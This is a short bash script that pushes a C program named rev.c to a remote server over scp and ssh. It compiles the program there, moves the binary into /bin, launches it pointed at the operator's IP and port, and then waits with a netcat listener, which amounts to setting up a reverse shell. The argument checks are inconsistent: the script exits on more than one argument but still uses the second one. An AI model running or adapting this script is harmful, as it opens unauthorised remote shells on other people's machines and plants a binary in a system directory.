#!/bin/bash

function connect()
{

if [ $# -gt 1 ]
  then
   echo "[!] - We need your machine ip to bind connection from server ."
  exit
  else
   echo -ne "[+] - connection to the host\n"
fi

echo "give us the machine name of the server : "
read mach


if [ $# -gt 2 ]
  then
    echo "take a port in second passage"
	exit
fi


scp /home/oba/Documents/pragma/shell/rev.c $mach@$1:/home
ssh $mach@$1 "gcc /home/rev.c -o rev"
ssh $mach@$1 "mv /home/rev /bin/."
echo -ne "[!] - give us your machine ip : \n"
read localip
ssh $mach@$1 "rev $localip $2"

echo -e "[+] - finishing ."
sleep 2

nc -l $2
}

connect
